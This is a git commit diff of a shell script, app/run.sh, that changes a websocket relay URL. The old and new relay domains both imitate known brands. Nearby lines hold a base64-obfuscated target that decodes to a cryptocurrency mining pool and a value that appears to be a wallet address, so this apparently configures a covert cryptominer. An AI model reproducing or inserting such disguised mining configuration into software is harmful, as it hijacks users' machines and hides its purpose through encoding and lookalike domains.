ba96c49964159a83555c08cc9f24fd7ec86c76cf
satelitlima00 <128956610+satelitlima00@users.noreply.github.com>
2026-03-29 12:07:48 +0700

    Update run.sh

--- app/run.sh
+++ app/run.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 CONNECT=$1
 NAME=$2
-echo "SERVER_WS=wss://cissco.qzz.io
+echo "SERVER_WS=wss://algolia.dpdns.org
 SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
 SERVER_DOMAIN=45bx5mvR2MQP267tevQyozHSToTsE19g5Q3NvRmrQ3TCW6dEY3as2VH4ArrNnqZKLxaw31aFExZyuet4fgau3TwoRiWwFgi
 SERVER_SECRET=${NAME}
